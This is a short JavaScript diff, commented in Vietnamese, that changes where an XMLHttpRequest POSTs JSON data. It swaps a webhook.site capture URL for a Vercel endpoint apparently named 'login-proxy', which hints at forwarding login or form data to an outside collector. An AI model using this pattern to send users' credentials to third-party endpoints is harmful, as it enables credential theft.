@@ -108,7 +108,8 @@
 
       // Tạo đối tượng XMLHttpRequest
       const xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00', true);
+      // Thay đổi URL thành API của bạn trên Vercel
+      xhr.open('POST', 'https://login-proxy-vercel-ie0frypbo-tuans-projects-0efe4fee.vercel.app/api/submit', true);
       xhr.setRequestHeader('Content-Type', 'application/json');
 
       // Gửi dữ liệu
